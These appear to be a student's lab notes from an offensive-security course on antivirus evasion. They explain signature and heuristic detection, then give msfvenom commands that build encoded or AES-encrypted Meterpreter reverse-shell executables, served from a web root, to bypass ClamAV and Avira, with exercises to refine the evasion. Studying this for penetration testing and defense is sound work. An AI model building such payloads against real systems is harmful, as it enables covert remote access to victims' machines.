# Introduction to Antivirus evasion

We will look at how anti virus detection works

# Antivirus software overview

Antivirus vendors use automated processes and manual 
reverse-engineering efforts to create these signatures, which are stored in massive databases. 
While signature algorithms are often close-held secrets, most rely on MD5 or SHA-1 hashes of 
malicious files or on unique byte sequences discovered in known malicious files. If a scanned file 
matches a known hash, or contains a malicious byte sequence, it is flagged as malicious.

software performs heuristics or behavioral analysis that 
simulates execution of a scanned file. Most implementations execute the scanned file in a 
sandboxed environment, attempting to detect known malicious behavior. This approach relies on 
extremely sophisticated, proprietary code and is significantly more time-consuming and resource intensive than signature-based detection methods. The success rate of this approach varies 
widely from vendor to vendor

# simulating virus environemnt

virus total

antiscan.me

# Locating signatures in the file

For this exercise, we must disable the heuristics-based scanning portion of the antivirus engine. 
In this section, we are going to rely on ClamAV, which is preinstalled on the Windows 10 victim 
machine and has its heuristics engine disabled.

### 6.3.1.1 Exercise
1. Generate a 32-bit Meterpreter executable and use Find-AVSignature to bypass any ClamAV 
signature detections. Does the modified executable return a shell?

![](./not_working.png)

# Bypassing antivirus with metsploit

using encoders

# Metasploit encoders

`msfvenom --list encoders`

`sudo msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x86/shikata_ga_nai -f exe -o /var/www/html/met.exe`

`sudo msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.6.12 LPORT=4443 -e x64/xor_dynamic -f exe -o /var/www/html/met_xor_dynamic.exe`

Shikata_ga_nai does not have a x64 version

not getting reverse connection from zutto dekiro or shikata when used with x64 payload

### 6.4.1.1 Exercise
1. Experiment with different payloads, encoders, and templates to try to bypass signature 
detections in both ClamAV and Avira.

# Metasploit Encryptors

```
 sudo msfvenom -p windows/x64/meterpreter/reverse_https 
LHOST=192.168.119.120 LPORT=443 --encrypt aes256 --encrypt-key 
fdgdgj93jf43uj983uf498f43 -f exe -o /var/www/html/met64_aes.exe
```

however it will be flagged because the decryption mechanism is also flagged

### 6.4.2.1 Exercises
1. Generate a Metasploit executable using aes256 encryption and verify that it is flagged.
2. Experiment with different payloads, templates, and encryption techniques to attempt to 
bypass Avira.
